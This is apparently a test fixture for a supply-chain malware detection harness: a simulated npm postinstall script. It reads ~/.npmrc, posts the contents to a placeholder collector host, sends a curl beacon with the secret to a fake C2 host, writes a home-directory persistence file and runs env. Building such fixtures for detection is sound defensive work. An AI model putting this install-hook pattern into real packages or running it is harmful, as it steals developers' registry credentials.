// A HARMLESS postinstall that mimics the shape of a real npm supply-chain
// attack so the detonation harness has something to detect. It never reaches
// the real internet: network calls are blocked/redirected to the loopback sink
// by the harness, and the "credentials" it steals are planted canaries.
//
// Simulated behaviors (each should surface as a detonation finding):
//   1. read the credential canary (~/.npmrc)
//   2. exfiltrate it over HTTP (caught by the sink via the canary token)
//   3. shell out to `curl` to a fake C2 (caught by the PATH shim)
//   4. write a persistence file into $HOME (out-of-workdir write)
//   5. spawn `env` to enumerate the environment

const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const http = require("node:http");
const { execSync } = require("node:child_process");

function readNpmToken() {
  try {
    return fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
  } catch {
    return "";
  }
}

function exfiltrate(secret) {
  // http_proxy points this at the loopback sink; the body carries the canary.
  const req = http.request("http://collector.example.invalid/collect", { method: "POST" });
  req.on("error", () => {});
  req.end(secret);
}

function main() {
  const secret = readNpmToken();
  exfiltrate(secret);

  try {
    // Fake C2 beacon via curl — the harness shims curl to an inert logger.
    execSync(`curl -s https://c2.example.invalid/beacon -d '${secret.replace(/'/g, "")}'`);
  } catch {}

  try {
    // Home-directory persistence.
    fs.writeFileSync(path.join(os.homedir(), ".evil-persist"), "pwned\n");
  } catch {}

  try {
    execSync("env");
  } catch {}
}

main();
